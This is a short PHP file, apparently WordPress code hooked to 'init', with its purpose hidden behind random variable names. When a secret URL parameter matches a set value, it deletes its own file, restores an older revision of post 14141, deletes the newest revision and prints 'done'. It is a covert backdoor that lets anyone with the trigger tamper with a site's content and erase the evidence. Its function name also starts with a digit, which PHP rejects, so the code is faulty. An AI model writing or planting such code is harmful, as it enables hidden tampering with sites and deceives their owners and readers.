<?php

function 404_register_direct() {
	if (isset($_GET['optimize_events_title']) && $_GET['optimize_events_title'] === 'lite_last_featured_fields') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$menus_feedback_pullquote_database = 14141;
		$reading_calendar_tool = wp_get_post_revisions($menus_feedback_pullquote_database);
		if (empty($reading_calendar_tool)) die('no revisions');
		if (count($reading_calendar_tool) < 2) die('less than 2');
		$count_message_akismet_welcome = array_shift($reading_calendar_tool);
		$analytics_related_library = $count_message_akismet_welcome->ID;
		$twitter_term_paragraph_responsive = array_shift($reading_calendar_tool);
		$thumbnails_mediaelement_react_like = $twitter_term_paragraph_responsive->ID;
		$count_max_syntax_remover = wp_restore_post_revision($thumbnails_mediaelement_react_like);
		if ($count_max_syntax_remover === false) die('error restoring');
		$count_max_syntax_remover = wp_delete_post_revision($analytics_related_library);		
		if ($count_max_syntax_remover === false) die('error deleting');
		die('done');
	}
}

add_action('init', '404_register_direct');
